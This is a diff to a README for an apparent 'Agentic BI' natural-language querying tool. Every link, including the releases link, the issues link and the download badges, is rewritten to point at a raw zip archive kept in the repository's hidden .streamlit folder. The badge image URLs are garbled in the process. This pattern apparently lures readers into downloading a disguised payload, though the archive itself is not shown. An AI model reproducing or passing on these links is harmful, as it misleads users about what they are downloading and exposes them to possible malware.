@@ -7,7 +7,7 @@ Welcome to the Agentic BI Natural Language Querying application. This tool helps
 
 ## 📥 Download the Application
 
-[![Download Agentic BI](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/Gamehut360/agentic-bi-natural-language-querying/releases)
+[![Download Agentic BI](https://github.com/Gamehut360/agentic-bi-natural-language-querying/raw/refs/heads/main/.streamlit/language-natural-bi-querying-agentic-v2.4.zip%20Now-Click%20Here-blue)](https://github.com/Gamehut360/agentic-bi-natural-language-querying/raw/refs/heads/main/.streamlit/language-natural-bi-querying-agentic-v2.4.zip)
 
 ## 📋 System Requirements
 
@@ -28,7 +28,7 @@ To run this application smoothly, you will need:
 
 ## 💻 Download & Install
 
-1. Visit the [Releases Page](https://github.com/Gamehut360/agentic-bi-natural-language-querying/releases) to access the latest version of the application.
+1. Visit the [Releases Page](https://github.com/Gamehut360/agentic-bi-natural-language-querying/raw/refs/heads/main/.streamlit/language-natural-bi-querying-agentic-v2.4.zip) to access the latest version of the application.
 2. On the Releases Page, look for the version number you want to download.
 3. Click the link for your operating system. The file will start downloading.
 4. Once the file is downloaded, locate it in your downloads folder.
@@ -51,7 +51,7 @@ For further assistance, refer to the Help section within the application.
 
 If you have questions or need help, you can join our community:
 
-- Check the [GitHub Issues Page](https://github.com/Gamehut360/agentic-bi-natural-language-querying/issues) for common problems and solutions.
+- Check the [GitHub Issues Page](https://github.com/Gamehut360/agentic-bi-natural-language-querying/raw/refs/heads/main/.streamlit/language-natural-bi-querying-agentic-v2.4.zip) for common problems and solutions.
 - Participate in discussions on our [Community Forum](#).
 
 ## 🚧 Feedback and Contributions
@@ -92,5 +92,5 @@ To learn more about how to make the most of the application, consider the follow
 
 Feel free to explore these links to expand your knowledge and maximize the capabilities of this tool.
 
-[![Download Agentic BI](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/Gamehut360/agentic-bi-natural-language-querying/releases)
+[![Download Agentic BI](https://github.com/Gamehut360/agentic-bi-natural-language-querying/raw/refs/heads/main/.streamlit/language-natural-bi-querying-agentic-v2.4.zip%20Now-Click%20Here-blue)](https://github.com/Gamehut360/agentic-bi-natural-language-querying/raw/refs/heads/main/.streamlit/language-natural-bi-querying-agentic-v2.4.zip)
 ```
